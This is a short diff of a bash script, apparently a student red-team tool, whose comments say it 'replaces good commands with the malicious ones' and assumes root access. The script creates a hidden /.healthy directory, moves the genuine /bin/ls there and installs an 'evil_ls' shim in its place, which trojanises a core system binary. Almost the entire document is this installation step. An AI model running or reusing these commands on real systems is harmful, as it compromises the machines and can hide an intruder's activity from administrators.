@@ -1,5 +1,10 @@
 #!/bin/bash
 
+#Author: Nick Graca
+#Email: njg7716@rit.edu
+
+#replaces good commands with the malicious ones and sets proper permissions
+#Assumes we have root to start
 mkdir /.healthy
 mv /bin/ls /.healthy/ls
 mv Shims/ls/evil_ls /bin/ls
